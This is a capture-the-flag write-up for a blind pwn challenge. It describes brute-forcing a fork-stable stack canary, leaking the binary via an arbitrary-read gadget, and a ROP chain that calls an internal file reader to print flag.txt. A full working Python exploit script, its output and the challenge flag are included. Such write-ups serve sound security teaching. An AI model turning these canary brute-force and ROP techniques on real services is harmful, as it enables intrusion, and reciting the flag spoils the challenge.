---
title: "serac"
ctf: "CryoVault Finals"
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: "OpenCode"
---

# serac

## Summary

Blind pwn against `nc 0.cloud.chals.io 16966` with no binary supplied. The relay
service forks per connection, so its stack canary is stable across connections:
a byte-wise brute force of the canary is possible using the `relayed N.` reply as
an "alive" oracle. Once the return address is controllable, a `pop rdi; ret`
gadget (found after recovering the binary through an arbitrary-read primitive)
calls an internal "seam" file reader with `"flag.txt"`, which writes the flag
back over the socket.

## Solution

### Step 1: Map the frame and brute-force the fork-stable canary

The framing is a 2-byte big-endian length followed by that many body bytes.
Lengths above 88 crash, which marks a `char buf[88]` protected by a stack
canary at offset 88; the saved `rbx/rbp/r12/r13` occupy offsets 104/112/120/128
and the return address is at offset 136.

Every length up to 88 gets `relayed N.\nserac> ` back. If the body extends past
88, the reply appears only when the 8 canary bytes in the body equal the real
canary (the `__stack_chk_fail` check happens on return). Because the parent
process forks for every connection, its canary — and the whole child stack — is
identical for all connections until the parent restarts. Recover the canary one
byte at a time, testing 256 candidates in parallel and keeping the byte that
still produces a reply (the first byte is always `0x00`).

After the binary was recovered (Step 2), this oracle also gave the exact frame
layout used below.

### Step 2: Recover the binary and find the flag reader

With a valid canary the return address is controlled. Returning to the trailing
`write` call of the body reader at `0x400756` writes `rdx = frame_length` bytes
from `rsi` to the connection. A `pop rsi; ret` gadget at `0x400572` lets us set
`rsi`, producing an arbitrary-read primitive:

```
ret -> 0x400572 ("pop rsi; ret") -> address -> 0x400756 (write(fd, rsi, rdx))
```

Reading `0x400000` upward reconstructs the non-PIE ELF (program headers,
`.dynsym`, `.rodata`). The interesting `.text` is:

* `0x400770` — `read_body(fd, n)`: reads exactly `n` bytes into `char buf[88]`
  with canary at offset 88, no length check (the bug).
* `0x4006c0` — `seam(path)`: `open(path, O_RDONLY)`, `read(fd, buf, min(len,256))`,
  then `write(connection_fd, buf, n)`; on failure it prints `no such seam`.
* `0x400570` — `pop rdi; ret`.
* `0x4016b0` — `"flag.txt"` in `.rodata` (`.rodata` is duplicated at `0x4026b0`).

### Step 3: ret2seam

Payload (168 bytes):

```
buf[88] | canary | local | rbx rbp r12 r13 | pop rdi; ret | "flag.txt" | seam()
```

`seam()` opens `flag.txt`, reads it, and writes it to the stored connection fd,
so the flag is printed by the service itself. The script below recovers the
canary from scratch (the server may have restarted since the last run) and then
executes the chain.

```python
#!/usr/bin/env python3
"""serac - recover the fork-stable canary, then ret2seam('flag.txt')."""
import json, os, socket, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST, PORT = "0.cloud.chals.io", 16966
POP_RDI, SEAM, FLAG_PATH, RET_MAIN = 0x400570, 0x4006C0, 0x4016B0, 0x4008AD
STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "canary_live.json")
WORKERS = 32

def probe(body, deadline=1.5):
    marker = b"relayed %d.\n" % len(body)
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except OSError:
        return None, b""
    out, t0 = b"", time.time()
    try:
        s.sendall(struct.pack(">H", len(body)) + body)
        s.settimeout(0.22)
        while time.time() - t0 < deadline:
            if marker in out:
                break
            try:
                d = s.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                break
            if not d:
                break
            out += d
    except OSError:
        pass
    finally:
        try: s.close()
        except Exception: pass
    return marker in out, out

def frame(known, guess=None):
    return b"\x00" * 88 + known + (bytes([guess]) if guess is not None else b"")

def alive(known, tries=4):
    for _ in range(tries):
        ok, _ = probe(frame(known))
        if ok:
            return True
        time.sleep(0.05)
    return False

def scan_byte(known):
    stop, hits = threading.Event(), []
    def work(v):
        if stop.is_set():
            return None
        for _ in range(2):
            ok, _ = probe(frame(known, v))
            if ok is None:
                continue
            if ok:
                return v
        return None
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(work, v) for v in range(256)]
        for f in as_completed(futs):
            r = f.result()
            if r is not None:
                hits.append(r); stop.set(); break
        for f in futs:
            f.cancel()
    return hits

def recover_canary(budget=600):
    known, end = b"\x00", time.time() + budget
    while len(known) < 8 and time.time() < end:
        if not alive(known, tries=3):
            print(f"[-] prefix {known.hex()} dead (restart), resetting")
            known = b"\x00"
            continue
        hits = scan_byte(known)
        print(f"[*] byte[{len(known)}] hits={[hex(h) for h in hits]}")
        if len(hits) != 1:
            continue
        cand = known + bytes([hits[0]])
        if [probe(frame(cand))[0] for _ in range(3)].count(True) < 2:
            continue
        known = cand
        json.dump({"canary": known.hex()}, open(STATE, "w"))
        print(f"[+] canary={known.hex()}")
    return known

def get_canary():
    if os.path.exists(STATE):
        try:
            c = bytes.fromhex(json.load(open(STATE))["canary"])
            if len(c) == 8 and alive(c, tries=2):
                return c
        except Exception:
            pass
    return recover_canary()

def payload(canary):
    b = bytearray(b"\x00" * 88 + canary)
    b += struct.pack("<Q", 0) + struct.pack("<Q", 0) * 4   # local + saved regs
    b += struct.pack("<Q", POP_RDI) + struct.pack("<Q", FLAG_PATH)
    b += struct.pack("<Q", SEAM) + struct.pack("<Q", RET_MAIN)
    return bytes(b)

def main():
    canary = get_canary()
    if len(canary) != 8:
        print("[-] canary recovery failed"); return 1
    print(f"[*] canary {canary.hex()}")
    for attempt in range(8):
        if not alive(canary, tries=2):
            canary = recover_canary()
            continue
        ok, out = probe(payload(canary), deadline=2.5)
        print(f"[*] attempt {attempt}: {out!r}")
        if b"isfcr{" in out:
            i = out.find(b"isfcr{"); j = out.find(b"}", i)
            print("[+] FLAG:", out[i:j + 1].decode())
            return 0
        time.sleep(0.3)
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

Observed output:

```
[*] byte[1] hits=['0x7a']
...
[+] canary=007a886311a57236
[*] attempt 0: b'serac relay up.\nserac> isfcr{tw0_4rg_g4t3d_r3v34l_p0p_rd1_rs1_s3r4c}'
[+] FLAG: isfcr{tw0_4rg_g4t3d_r3v34l_p0p_rd1_rs1_s3r4c}
```

The four `isfcr{...d3c0y...}` strings in `.rodata` are deliberate decoys; the real
flag is read from `flag.txt` at runtime by the `seam` function.

## Flag

```
isfcr{tw0_4rg_g4t3d_r3v34l_p0p_rd1_rs1_s3r4c}
```
